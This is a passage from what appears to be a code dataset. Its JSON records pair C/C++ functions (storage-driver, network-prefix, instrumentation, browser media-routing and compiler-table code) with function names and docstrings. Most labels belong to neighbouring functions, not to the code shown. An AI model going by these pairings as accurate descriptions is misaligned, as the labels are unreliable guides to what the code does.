WUNTRACED);\\n        sleep(1);\\n    }\\n\\n    \/* clean up and exit *\/\\n    DEBUG_PRINT (DEBUG_LOG, \"\\\\nExiting Agent Monitoring..\\\\n\");\\n    free (pProcessInfo);\\n    pProcessInfo = NULL;\\n    return RETURN_SUCCESS;\\n\\n}'}","id":3532}
{"content":"{'function_name': 'psCloseHandle', 'docstring': '\/\/PulseBasePtr(h)->Delete();\\r', 'code': 'psHSCRIPT PULSEAPI psCreateJScript(BOOL bDebugEnabled)\\r\\n{\\r\\n\\tCScriptHostImpl* p = NEW CScriptHostImpl(bDebugEnabled);\\r\\n\\tif (p==NULL)\\r\\n\\t\\treturn NULL;\\r\\n\\r\\n\\tHRESULT hr = p->CreateScriptEngine(L\"JScript\");\\r\\n\\tif (FAILED(hr))\\r\\n\\t{\\r\\n\\t\\tCPulseBase::DeleteThis(p);\\r\\n\\t\\treturn NULL;\\r\\n\\t}\\r\\n\\r\\n\\t\/\/\/\/ hook InvokeEx\\r\\n\\t\/\/CComPtr<IDispatch> pDisp;\\r\\n\\t\/\/p->m_as->GetScriptDispatch(NULL, &pDisp);\\r\\n\\t\/\/m_hook.SetDispatchEx(pDisp);\\r\\n\\r\\n\\treturn reinterpret_cast<psHSCRIPT>((CPulseBase*)p);\\r\\n}'}","id":3534}
{"content":"{'function_name': 'ahci_ch_intr_main', 'docstring': '\/* Process NOTIFY events *\/', 'code': 'static int ahci_check_collision(struct ahci_channel *ch, PacketAtaio *ataio) {\\n  int t = ataio->target_id;\\n\\n  if ((ataio->func_code == XPT_ATA_IO) &&\\n      (ataio->cmd.flags & CAM_ATAIO_FPDMA)) {\\n    \/* Tagged command while we have no supported tag free. *\/\\n    if (((~ch->oslots) & (0xffffffff >> (32 - ch->curr[t].tags))) == 0)\\n      return (1);\\n    \/* If we have FBS *\/\\n    if (ch->fbs_enabled) {\\n      \/* Tagged command while untagged are active. *\/\\n      if (ch->numrslotspd[t] != 0 && ch->numtslotspd[t] == 0) return (1);\\n    } else {\\n      \/* Tagged command while untagged are active. *\/\\n      if (ch->numrslots != 0 && ch->numtslots == 0) return (1);\\n      \/* Tagged command while tagged to other target is active. *\/\\n      if (ch->numtslots != 0 && ch->taggedtarget != ataio->target_id)\\n        return (1);\\n    }\\n  } else {\\n    \/* If we have FBS *\/\\n    if (ch->fbs_enabled) {\\n      \/* Untagged command while tagged are active. *\/\\n      if (ch->numrslotspd[t] != 0 && ch->numtslotspd[t] != 0) return (1);\\n    } else {\\n      \/* Untagged command while tagged are active. *\/\\n      if (ch->numrslots != 0 && ch->numtslots != 0) return (1);\\n    }\\n  }\\n  if ((ataio->func_code == XPT_ATA_IO) &&\\n      (ataio->cmd.flags & (CAM_ATAIO_CONTROL | CAM_ATAIO_NEEDRESULT))) {\\n    \/* Atomic command while anything active. *\/\\n    if (ch->numrslots != 0) return (1);\\n  }\\n  \/* We have some atomic command running. *\/\\n  if (ch->aslots != 0) return (1);\\n  return (0);\\n}'}","id":3537}
{"content":"{'function_name': 'getMarkerArray', 'docstring': '\/\/Function purpose is to return a vector store each hash table length for insert markers.', 'code': 'string getLessPrefix(string prefix, int dstMask){\\n\\t\/\/Function purpose is to return a string with less-bit prefix matched with dstMask length from mask standard. Assist setMarker()\\'s tables.\\n\\tstring address[4];    \/\/the four parts of ip address\\n\\tconst char charToSearch = \\'.\\';\\t\/\/current delimitor for prefix\\n\\tsize_t charPos;\\n\\tint begin;      \/\/the position to begin a part of ip\\n\\tsize_t oldPos;  \/\/the old position for next part\\n\\tint index;      \/\/index for the address array\\n\\tcharPos = prefix.find(charToSearch,0);\\n\\tindex = 0;\\n\\toldPos = 0;\\n\\tbegin = 0;\\n\\twhile(charPos != string::npos){\\n\\t\\taddress[index++] = prefix.substr(begin,charPos-oldPos);\\n\\t\\tsize_t charSearchPos = charPos + 1;\\n\\t\\tbegin = charSearchPos;\\n\\t\\toldPos = charSearchPos;\\n\\t\\tcharPos = prefix.find(charToSearch,charSearchPos);\\n\\t}\\n\\taddress[index] = prefix.substr(oldPos);\\n\\t\/\/now address[4] holds the four IP parts.\\n\\tif((dstMask % 8) == 0){\\n\\t\\tstring s;\\n\\t\\tfor(int i = 0; i < (dstMask\/8); i++)\\n\\t\\t\\ts += (address[i] + \".\");\\n\\t\\tfor(int i = (dstMask\/8); i < 4; i++)\\n\\t\\t\\ts += \"0.\";\\n\\t\\treturn s.substr(0,s.length()-1);\\n\\t}else{\\n\\t\\tint t = atoi(address[dstMask\/8].c_str());\\n\\t\\tint k = dstMask - (dstMask\/8)*8;\\n\\t\\tint base = 128, sum = 0;\\n\\t\\tfor(int i = 0; i < k; i++){\\n\\t\\t\\tsum += base;\\n\\t\\t\\tbase >>= 1;\\n\\t\\t}\\n\\t\\t\/\/cout << \"t: \" << t << \" with sum: \" << sum << endl;\\n\\t\\tt = t & sum;\\n\\t\\t\/\/cout << t + \"\" << endl;\\n\\t\\tstringstream ss;\\n\\t\\tss << t;\\t\\t\\t\\t\\n\\t\\t\/\/cout << ss.str() << endl;\\n\\n\\t\\tstring temp[4];\\n\\t\\tfor(int i = 0; i < 4; i++)\\n\\t\\t\\tif(i == (dstMask\/8))\\n\\t\\t\\t\\ttemp[i] = ss.str();\\n\\t\\t\\telse\\n\\t\\t\\t\\ttemp[i] = address[i];\\n\\t\\t\/\/cout << temp[0]+temp[1]+temp[2]+temp[3] << endl;\\n\\t\\tstring s;\\n\\t\\tfor(int i = 0; i <= (dstMask\/8); i++)\\n\\t\\t\\ts += (temp[i] + \".\");\\n\\t\\tfor(int i = (dstMask\/8)+1; i < 4; i++)\\n\\t\\t\\ts += \"0.\";\\n\\t\\t\\n\\t\\treturn s.substr(0,s.length()-1);\\t\\t\\n\\t}\\t\\t\\n}'}","id":3545}
{"content":"{'function_name': 'real_main', 'docstring': '\/\/ solve1', 'code': 'static int test_random(int argc, char ** argv)\\n{\\n    int rc = 0;\\n    int ai = 0;\\n    const u_t n_tests = strtoul(argv[ai++], 0, 0); \/\/ max\\n    const u_t nmin = strtoul(argv[ai++], 0, 0);\\n    const u_t nmax = strtoul(argv[ai++], 0, 0);\\n    const u_t pmin = strtoul(argv[ai++], 0, 0);\\n    const u_t pmax = strtoul(argv[ai++], 0, 0);\\n    const u_t mmin = strtoul(argv[ai++], 0, 0);\\n    const u_t mmax = strtoul(argv[ai++], 0, 0);\\n    u_t ti = 0;\\n    for (ti = 0; (rc == 0) && (ti < n_tests); ++ti)\\n    {\\n        if ((ti & (ti - 1)) == 0) {\\n            cerr << \"Ran \" << ti << \\'\/\\' << n_tests << \\'\\\\n\\'; }\\n        u_t n = rand_minmax(nmin, nmax);\\n        u_t p = rand_minmax(pmin, pmax);\\n        u_t mmax_by_p = (1u << p) - 1;\\n        u_t m = rand_minmax(min(mmin, mmax_by_p), min(mmax, mmax_by_p));\\n        vvuc_t prefs; prefs.reserve(n);\\n        vvuc_t forbiddens; forbiddens.reserve(m);\\n        vuc_t pref; pref.reserve(p);\\n        while (prefs.size() < n)\\n        {\\n            prefs.push_back(rand_pref(pref, p));\\n        }\\n        while (forbiddens.size() < m)\\n        {\\n            forbiddens.push_back(rand_pref(pref, p));\\n        }\\n        rc = test_case(prefs, forbiddens);\\n    }\\n    return rc;\\n}'}","id":3548}
{"content":"{'function_name': 'ShouldShowDeviceSelectorView', 'docstring': '\/\/ Playback or Tab Mirroring.', 'code': \"absl::optional<media_router::MediaRoute> GetSessionRoute(\\n    const std::string& item_id,\\n    base::WeakPtr<media_message_center::MediaNotificationItem> item,\\n    content::BrowserContext* context) {\\n  if (!media_router::MediaRouterEnabled(context)) {\\n    return absl::nullopt;\\n  }\\n\\n  \/\/ Return absl::nullopt if the item is not a local media session.\\n  if (!item || item->SourceType() !=\\n                   media_message_center::SourceType::kLocalMediaSession) {\\n    return absl::nullopt;\\n  }\\n\\n  \/\/ Return absl::nullopt if fallback to tab mirroring is disabled, and\\n  \/\/ media session doesn't have an associated Remote Playback route.\\n  if (!base::FeatureList::IsEnabled(\\n          media_router::kFallbackToAudioTabMirroring) &&\\n      !HasRemotePlaybackRoute(item)) {\\n    return absl::nullopt;\\n  }\\n\\n  auto* web_contents =\\n      content::MediaSession::GetWebContentsFromRequestId(item_id);\\n  if (!web_contents) {\\n    return absl::nullopt;\\n  }\\n\\n  const int item_tab_id =\\n      sessions::SessionTabHelper::IdForTab(web_contents).id();\\n  for (const auto& route :\\n       media_router::MediaRouterFactory::GetApiForBrowserContext(context)\\n           ->GetCurrentRoutes()) {\\n    media_router::MediaSource media_source = route.media_source();\\n    absl::optional<int> tab_id_from_route_id;\\n    if (media_source.IsRemotePlaybackSource()) {\\n      tab_id_from_route_id = media_source.TabIdFromRemotePlaybackSource();\\n    } else if (media_source.IsTabMirroringSource()) {\\n      tab_id_from_route_id = media_source.TabId();\\n    }\\n\\n    if (tab_id_from_route_id.has_value() &&\\n        tab_id_from_route_id.value() == item_tab_id) {\\n      return route;\\n    }\\n  }\\n\\n  return absl::nullopt;\\n}\"}","id":3550}
{"content":"{'function_name': 'get_pc_by_symbol', 'docstring': '\/\/ Try to find the symbol in the dynamic symbol table.', 'code': 'static void\\ninstru_funcs_module_load(void *drcontext, const module_data_t *mod, bool loaded)\\n{\\n    if (drcontext == NULL || mod == NULL)\\n        return;\\n\\n    uint64 ms_start = dr_get_milliseconds();\\n    const char *mod_name = get_module_basename(mod);\\n    NOTIFY(2, \"instru_funcs_module_load for %s\\\\n\", mod_name);\\n    \/\/ We need to go through all the functions to identify duplicates and adjust\\n    \/\/ arg counts before we can write to funclist.  We use this vector to remember\\n    \/\/ what to write.  We expect the common case to be zero entries since the\\n    \/\/ average app library probably has zero traced functions in it.\\n    drvector_t vec_pcs;\\n    drvector_init(&vec_pcs, 0, false, nullptr);\\n    for (size_t i = 0; i < func_names.entries; i++) {\\n        func_metadata_t *f = (func_metadata_t *)drvector_get_entry(&func_names, (uint)i);\\n        app_pc f_pc = get_pc_by_symbol(mod, f->name);\\n        if (f_pc == NULL)\\n            continue;\\n        drvector_append(&vec_pcs, (void *)f_pc);\\n        dr_mutex_lock(funcs_wrapped_lock);\\n        int id = 0;\\n        int existing_id = (int)(ptr_int_t)hashtable_lookup(&pc2idplus1, (void *)f_pc);\\n        if (existing_id != 0) {\\n            \/\/ Another symbol mapping to the same pc is already wrapped.\\n            \/\/ The number of args will be the minimum count for all those registered,\\n            \/\/ since the code must be ignoring extra arguments.\\n            id = existing_id - 1 \/*table stores +1*\/;\\n            func_metadata_t *f_traced =\\n                (func_metadata_t *)drvector_get_entry(&funcs_wrapped, (uint)id);\\n            f_traced->arg_num = std::min(f->arg_num, f_traced->arg_num);\\n            NOTIFY(1, \"Duplicate-pc hook: %s!%s == id %d; using min=%d args\\\\n\", mod_name,\\n                   f->name, id, f_traced->arg_num);\\n        } else {\\n            id = wrap_id++;\\n            drvector_append(&funcs_wrapped,\\n                            create_func_metadata(f->name, id, f->arg_num, f->noret));\\n            if (!hashtable_add(&pc2idplus1, (void *)f_pc, (void *)(ptr_int_t)(id + 1)))\\n                DR_ASSERT(false && \"Failed to maintain pc2idplus1 internal hashtable\");\\n        }\\n        dr_mutex_unlock(funcs_wrapped_lock);\\n        if (existing_id != 0) {\\n            continue;\\n        }\\n        uint flags = 0;\\n        if (!f->noret && op_record_replace_retaddr.get_value())\\n            flags = DRWRAP_REPLACE_RETADDR;\\n        if (drwrap_wrap_ex(f_pc, func_pre_hook, f->noret ? nullptr : func_post_hook,\\n                           (void *)(ptr_uint_t)id, flags)) {\\n            NOTIFY(1, \"Inserted hooks for %s!%s @%p == id %d\\\\n\", mod_name, f->name, f_pc,\\n                   id);\\n        } else {\\n            \/\/ We\\'ve ruled out two symbols mapping to the same pc, so this is some\\n            \/\/ unexpected, possibly severe error.\\n            NOTIFY(0, \"Failed to insert hooks for %s!%s == id %d\\\\n\", mod_name, f->name,\\n                   id);\\n        }\\n    }\\n    \/\/ Now write out the traced functions.\\n    dr_mutex_lock(funcs_wrapped_lock);\\n    for (size_t i = 0; i < vec_pcs.entries; ++i) {\\n        app_pc f_pc = (app_pc)drvector_get_entry(&vec_pcs, (uint)i);\\n        int id = (int)(ptr_int_t)hashtable_lookup(&pc2idplus1, (void *)f_pc);\\n        DR_ASSERT(id != 0 && \"Failed to maintain pc2idplus1 internal hashtable\");\\n        --id; \/\/ Table stores +1.\\n        func_metadata_t *f_traced =\\n            (func_metadata_t *)drvector_get_entry(&funcs_wrapped, (uint)id);\\n        char qual[DRMEMTRACE_MAX_QUALIFIED_FUNC_LEN];\\n        int len = dr_snprintf(qual, BUFFER_SIZE_ELEMENTS(qual), \"%d,%d,%p,%s%s!%s\\\\n\", id,\\n                              f_traced->arg_num, f_pc, f_traced->noret ? \"noret,\" : \"\",\\n                              mod_name, f_traced->name);\\n        if (len < 0 || len == BUFFER_SIZE_ELEMENTS(qual)) {\\n            NOTIFY(0, \"Qualified name is too long and was truncated: %s!%s\\\\n\", mod_name,\\n                   f_traced->name);\\n        }\\n        NULL_TERMINATE_BUFFER(qual);\\n        size_t sz = strlen(qual);\\n        if (write_file_func(funclist_fd, qual, sz) != static_cast<ssize_t>(sz))\\n            NOTIFY(0, \"Failed to write to funclist file\\\\n\");\\n    }\\n    dr_mutex_unlock(funcs_wrapped_lock);\\n    drvector_delete(&vec_pcs);\\n\\n    uint64 ms_elapsed = dr_get_milliseconds() - ms_start;\\n    NOTIFY((ms_elapsed > 10U) ? 1U : 2U,\\n           \"Symbol queries for %s took \" UINT64_FORMAT_STRING \"ms\\\\n\", mod_name,\\n           ms_elapsed);\\n}'}","id":3553}
{"content":"{'function_name': 'p_GeoDaWeight__GetPointer', 'docstring': '\/\/ return c++ object pointer', 'code': 'int p_GeoDaWeight__GetNumObs(SEXP xp)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  \/\/ invoke the function\\n  return ptr->GetNumObs();\\n}'}","id":3557}
{"content":"{'function_name': 'pps2sow', 'docstring': '\/* pps always early compare with zda *\/', 'code': 'static int readimgbuf(raw_t *raw)\\n{\\n    prcopt_t *popt=(prcopt_t*)raw->optp;\\n    char imgpath[1024],*pstr;\\n\\n    sprintf(imgpath,\"%s\/%d_%ld_%ld.jpg\",popt->monodir,raw->img.id+1,\\n            raw->m39.fts.tv_sec,\\n            raw->m39.fts.tv_nsec);\\n\\n    \/* load jpg image file *\/\\n    if (!readjpeg(imgpath,raw->m39.time,&raw->img,0)) {\\n        if (get_m39_img(popt->monodir,raw->m39.fts.tv_sec,raw->m39.fts.tv_nsec,imgpath)) {\\n\\n            if (!readjpeg(imgpath,raw->m39.time,&raw->img,0)) {\\n                trace(2,\"read jpg image fail: time=%sl\\\\n\",time_str(raw->m39.time,4));\\n                return 0;\\n            }\\n            if ((pstr=strrchr(imgpath,\\'\/\\'))) {\\n                sscanf(pstr,\"\/%d_%ld_%ld.jpg\",&raw->img.id,\\n                       &raw->m39.fts.tv_sec,\\n                       &raw->m39.fts.tv_nsec);\\n            }\\n            goto ok;\\n        }\\n        else {\\n            trace(2,\"no such file: time=%s\\\\n\",\\n                  time_str(raw->m39.time,4)); return 0;\\n        }\\n    }\\nok:\\n#if 0\\n    \/* display image for debug *\/\\n    dipsplyimg(&raw->img);\\n#endif\\n    return 11;\\n}'}","id":3559}
{"content":"{'function_name': 'MakeOneStrForTree', 'docstring': \"\/*\\n   int prNoDT = 0;                                           \/\/\u041f\u0440\u0438\u0437\u043d\u0430\u043a \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0438\u044f \u0434\u0430\u0442\u044b\/\u0432\u0440\u0435\u043c\u0435\u043d\u0438 (\u0447\u0430\u0441\u044b \u043d\u0435 \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u044b)\\n   if((sysTime.wYear == 2004 && sysTime.wMonth == 1 && sysTime.wDay == 1) ||\\n       sysTime.wYear >= 2055 || sysTime.wYear < 2004) prNoDT = 1;                 \/\/\u041f\u0440\u0438\u0437\u043d\u0430\u043a \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0438\u044f \u0434\u0430\u0442\u044b\/\u0432\u0440\u0435\u043c\u0435\u043d\u0438 (\u0447\u0430\u0441\u044b \u043d\u0435 \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u044b)\\n   if(prNoDT == 1)                                           \/\/\u041f\u0440\u0438\u0437\u043d\u0430\u043a \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0438\u044f \u0434\u0430\u0442\u044b\/\u0432\u0440\u0435\u043c\u0435\u043d\u0438 (\u0447\u0430\u0441\u044b \u043d\u0435 \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u044b)\\n   {  for(int i=0; i<sizeof(sDate); i++)\\n      {  if(*(sDate+i) == 0)  break;\\n         if(*(sDate+i) >= '0' && *(sDate+i) <= '9') *(sDate+i) = '-';\\n      }\\n      for(int i=0; i<sizeof(sTime); i++)\\n      {  if(*(sTime+i) == 0)  break;\\n         if(*(sTime+i) >= '0' && *(sTime+i) <= '9') *(sTime+i) = '-';\\n      }\\n   }\\n*\/\", 'code': 'static int MkAbsendName(char *oneStr, char *Name, PAR_FILE *pf)\/\/\u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0441\u0442\u0440\u043e\u043a\u0438 \u0441\u0438\u043c\u0432\u043e\u043b\u043e\u0432 \u0434\u043b\u044f \u043e\u0442\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0432 \u0434\u0435\u0440\u0435\u0432\u0435 \u0434\u043b\u044f \u043e\u0442\u0441\u0443\u0442\u0442\u0432\u0443\u044e\u0449\u0435\u0433\u043e \u0438\u043c\u0435\u043d\u0438\\n{\\n   char size[32], *as;\\n   if(pf->type == 48)                                        \/\/\u042d\u0442\u043e \u0438\u043c\u044f \u043f\u0430\u043f\u043a\u0438\\n   {  sprintf(oneStr, \"%s\", Name);                           \/\/\u0414\u043b\u044f \u043f\u0430\u043f\u043a\u0438 \u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u043c\u0435\u043d\u044f\u0435\u043c\\n      return 0;\\n   }\\n   char Ext[8];\\n   MkInformName(Name, Ext);                                  \/\/\u0424\u043e\u0440\u043c\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0442\u0438\u0432\u043d\u043e\u0433\u043e \u0438\u043c\u0435\u043d\u0438\\n   int l = sprintf(oneStr, \"  %s\", Name);\\n   for(int i=l; i<256; i++)                                  \/\/\u0417\u0430\u043f\u043e\u043b\u043d\u0438\u043b\u0438 \u0445\u0432\u043e\u0441\u0442 \u0441\u0442\u0440\u043e\u043a\u0438 \u043f\u0440\u043e\u0431\u0435\u043b\u0430\u043c\u0438\\n       *(oneStr + i) = \\' \\';\\n   switch(Conf.typeSize)                                     \/\/0-\u0431\u0430\u0439\u0442\u044b, 1-\u041a\u0431\u0430\u0439\u0442\u044b, 2-\u041c\u0431\u0430\u0439\u0442\u044b, 3-\u0413\u0411\u0430\u0439\u0442\u044b\\n   {  case 0: sprintf(size, \"%12.0lf\", double(pf->SizeF));\\n              as = Char_Dig_p(size, 15);  break;             \/\/\u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \u0432 \u0440\u0430\u0437\u0440\u044f\u0434\u043a\u0443\\n      case 1: sprintf(size, \"%11.1lf\", double(pf->SizeF)\/1024.0);\\n              as = Char_Dig_p_n(size, 12, 1);  break;        \/\/\u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \u0432 \u0440\u0430\u0437\u0440\u044f\u0434\u043a\u0443\\n      case 2: sprintf(size, \"%9.2lf\", double(pf->SizeF)\/1024.0\/1024.0);\\n              as = Char_Dig_p_n(size, 9, 2);  break;         \/\/\u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \u0432 \u0440\u0430\u0437\u0440\u044f\u0434\u043a\u0443\\n      case 3: sprintf(size, \"%7.3lf\", double(pf->SizeF)\/1024.0\/1024.0\/1024.0);\\n              as = Char_Dig_p_n(size, 6, 3);  break;         \/\/\u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \u0432 \u0440\u0430\u0437\u0440\u044f\u0434\u043a\u0443\\n   }\\n   char sDate[64], sTime[64], Pr = \\'R\\';\\n   SYSTEMTIME sysTime;\\n   pf->Year = (tabMME + indTabMME)->dt.year;\\n   pf->Mon = BYTE((tabMME + indTabMME)->dt.mon);\\n   pf->Day = BYTE((tabMME + indTabMME)->dt.day);\\n   pf->Hour = BYTE((tabMME + indTabMME)->dt.hour);\\n   pf->Min = BYTE((tabMME + indTabMME)->dt.min);\\n   pf->Sec = BYTE((tabMME + indTabMME)->dt.sec);\\n   sysTime.wYear = (pf->Year == 0) ? WORD(1900) : pf->Year;\\n   sysTime.wMonth = (pf->Mon == 0) ? WORD(1) : pf->Mon;\\n   sysTime.wDay = (pf->Day == 0) ? WORD(1) : pf->Day;\\n   sysTime.wHour = pf->Hour;\\n   sysTime.wMinute = pf->Min;\\n   sysTime.wSecond = pf->Sec;\\n   sysTime.wDayOfWeek = 1;\\n   sysTime.wMilliseconds = 0;\\n\\n   GetDateFormat(LOCALE_USER_DEFAULT, DATE_SHORTDATE, &sysTime, NULL, sDate, 64);\\n   GetTimeFormat(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT | LOCALE_NOUSEROVERRIDE, &sysTime, NULL, sTime, 64);\\n   sysTime.wHour = WORD((tabMME + indTabMME)->timeLong \/ 3600);\\n   int M1 = (tabMME + indTabMME)->timeLong - sysTime.wHour * 3600;\\n   sysTime.wMinute = WORD(M1 \/ 60);\\n   sysTime.wSecond = WORD(M1 - sysTime.wMinute * 60);\\n   sysTime.wMilliseconds = 0;\\n   char sLTime[64];\\n   GetTimeFormat(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT | LOCALE_NOUSEROVERRIDE, &sysTime, NULL, sLTime, 64);\\n   int n = (Conf.poz_Ql == 0) ? 59 : 63;\\n   if(Conf.poz_In == 0)                                   \/\/\u0418\u0441\u0442\u043e\u0447\u043d\u0438\u043a \u0437\u0430\u043f\u0438\u0441\u0438: 0-\u0432 \u043a\u043e\u043b\u043e\u043d\u043a\u0435, 1-\u0432 \u0438\u043c\u0435\u043d\u0438, 2-\u043d\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0442\u044c\\n      sprintf(oneStr + n,  \"%s        \", (tabMME + indTabMME)->nameIn);\\n   if(Conf.poz_Ql == 0)                                   \/\/\u041a\u0430\u0447\u0435\u0441\u0442\u0432\u043e \u0437\u0430\u043f\u0438\u0441\u0438: 0-\u0432 \u043a\u043e\u043b\u043e\u043d\u043a\u0435, 1-\u0432 \u0438\u043c\u0435\u043d\u0438, 2-\u043d\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0442\u044c\\n      sprintf(oneStr + 66, \"%s        \", (tabMME + indTabMME)->Qual);\\n   sprintf(oneStr+70, \"%s %s  [%8s]  %c %10s  %8s\", as, strSize[Conf.typeSize], sLTime, Pr, sDate, sTime);\\n   return 0;\\n}'}","id":3567}
{"content":"{'function_name': 'getDisp20Opcode', 'docstring': \"\/\/ Instruction doesn't exist in this table.\", 'code': \"LLVM_READONLY\\nint getMemOpcode(uint16_t Opcode) {\\nstatic const uint16_t getMemOpcodeTable[][2] = {\\n  { SystemZ::ADBR, SystemZ::ADB },\\n  { SystemZ::AEBR, SystemZ::AEB },\\n  { SystemZ::AGFR, SystemZ::AGF },\\n  { SystemZ::AGR, SystemZ::AG },\\n  { SystemZ::ALCGR, SystemZ::ALCG },\\n  { SystemZ::ALCR, SystemZ::ALC },\\n  { SystemZ::ALGFR, SystemZ::ALGF },\\n  { SystemZ::ALGR, SystemZ::ALG },\\n  { SystemZ::ALR, SystemZ::AL },\\n  { SystemZ::AR, SystemZ::A },\\n  { SystemZ::CDBR, SystemZ::CDB },\\n  { SystemZ::CEBR, SystemZ::CEB },\\n  { SystemZ::CGFR, SystemZ::CGF },\\n  { SystemZ::CGR, SystemZ::CG },\\n  { SystemZ::CLGFR, SystemZ::CLGF },\\n  { SystemZ::CLGR, SystemZ::CLG },\\n  { SystemZ::CLR, SystemZ::CL },\\n  { SystemZ::CR, SystemZ::C },\\n  { SystemZ::DDBR, SystemZ::DDB },\\n  { SystemZ::DEBR, SystemZ::DEB },\\n  { SystemZ::DLGR, SystemZ::DLG },\\n  { SystemZ::DLR, SystemZ::DL },\\n  { SystemZ::DSGFR, SystemZ::DSGF },\\n  { SystemZ::DSGR, SystemZ::DSG },\\n  { SystemZ::LBR, SystemZ::LB },\\n  { SystemZ::LDEBR, SystemZ::LDEB },\\n  { SystemZ::LDR, SystemZ::LD },\\n  { SystemZ::LER, SystemZ::LE },\\n  { SystemZ::LGBR, SystemZ::LGB },\\n  { SystemZ::LGFR, SystemZ::LGF },\\n  { SystemZ::LGHR, SystemZ::LGH },\\n  { SystemZ::LGR, SystemZ::LG },\\n  { SystemZ::LHR, SystemZ::LH },\\n  { SystemZ::LLCR, SystemZ::LLC },\\n  { SystemZ::LLCRMux, SystemZ::LLCMux },\\n  { SystemZ::LLGCR, SystemZ::LLGC },\\n  { SystemZ::LLGFR, SystemZ::LLGF },\\n  { SystemZ::LLGHR, SystemZ::LLGH },\\n  { SystemZ::LLHR, SystemZ::LLH },\\n  { SystemZ::LLHRMux, SystemZ::LLHMux },\\n  { SystemZ::LR, SystemZ::L },\\n  { SystemZ::LRMux, SystemZ::LMux },\\n  { SystemZ::LRVGR, SystemZ::LRVG },\\n  { SystemZ::LRVR, SystemZ::LRV },\\n  { SystemZ::LTGFR, SystemZ::LTGF },\\n  { SystemZ::LTGR, SystemZ::LTG },\\n  { SystemZ::LTR, SystemZ::LT },\\n  { SystemZ::LXDBR, SystemZ::LXDB },\\n  { SystemZ::LXEBR, SystemZ::LXEB },\\n  { SystemZ::MADBR, SystemZ::MADB },\\n  { SystemZ::MAEBR, SystemZ::MAEB },\\n  { SystemZ::MDBR, SystemZ::MDB },\\n  { SystemZ::MDEBR, SystemZ::MDEB },\\n  { SystemZ::MEEBR, SystemZ::MEEB },\\n  { SystemZ::MLGR, SystemZ::MLG },\\n  { SystemZ::MSDBR, SystemZ::MSDB },\\n  { SystemZ::MSEBR, SystemZ::MSEB },\\n  { SystemZ::MSGFR, SystemZ::MSGF },\\n  { SystemZ::MSGR, SystemZ::MSG },\\n  { SystemZ::MSR, SystemZ::MS },\\n  { SystemZ::MXDBR, SystemZ::MXDB },\\n  { SystemZ::NGR, SystemZ::NG },\\n  { SystemZ::NR, SystemZ::N },\\n  { SystemZ::OGR, SystemZ::OG },\\n  { SystemZ::OR, SystemZ::O },\\n  { SystemZ::SDBR, SystemZ::SDB },\\n  { SystemZ::SEBR, SystemZ::SEB },\\n  { SystemZ::SGFR, SystemZ::SGF },\\n  { SystemZ::SGR, SystemZ::SG },\\n  { SystemZ::SLBR, SystemZ::SLB },\\n  { SystemZ::SLGBR, SystemZ::SLBG },\\n  { SystemZ::SLGFR, SystemZ::SLGF },\\n  { SystemZ::SLGR, SystemZ::SLG },\\n  { SystemZ::SLR, SystemZ::SL },\\n  { SystemZ::SQDBR, SystemZ::SQDB },\\n  { SystemZ::SQEBR, SystemZ::SQEB },\\n  { SystemZ::SR, SystemZ::S },\\n  { SystemZ::XGR, SystemZ::XG },\\n  { SystemZ::XR, SystemZ::X },\\n}; \/\/ End of getMemOpcodeTable\\n\\n  unsigned mid;\\n  unsigned start = 0;\\n  unsigned end = 79;\\n  while (start < end) {\\n    mid = start + (end - start)\/2;\\n    if (Opcode == getMemOpcodeTable[mid][0]) {\\n      break;\\n    }\\n    if (Opcode < getMemOpcodeTable[mid][0])\\n      end = mid;\\n    else\\n      start = mid + 1;\\n  }\\n  if (start == end)\\n    return -1; \/\/ Instruction doesn't exist in this table.\\n\\n  return getMemOpcodeTable[mid][1];\\n}\"}","id":3573}
{"content":"{'function_name': 'ahci_process_timeout', 'docstring': '\/* Handle the rest of commands. *\/', 'code': 'static void ahci_timeout(struct ahci_slot *slot) {\\n  struct ahci_channel *ch = slot->ch;\\n  device_t dev = ch->dev;\\n  uint32_t sstatus;\\n  int ccs;\\n  int i;\\n\\n  \/* Check for stale timeout. *\/\\n  if (slot->state < AHCI_SLOT_RUNNING) return;\\n\\n  \/* Check if slot was not being executed last time we checked. *\/\\n  if (slot->state < AHCI_SLOT_EXECUTING) {\\n    \/* Check if slot started executing. *\/\\n    sstatus = ATA_INL(ch->r_mem, AHCI_P_SACT);\\n    ccs = (ATA_INL(ch->r_mem, AHCI_P_CMD) & AHCI_P_CMD_CCS_MASK) >>\\n          AHCI_P_CMD_CCS_SHIFT;\\n    if ((sstatus & (1 << slot->slot)) != 0 || ccs == slot->slot ||\\n        ch->fbs_enabled || ch->wrongccs)\\n      slot->state = 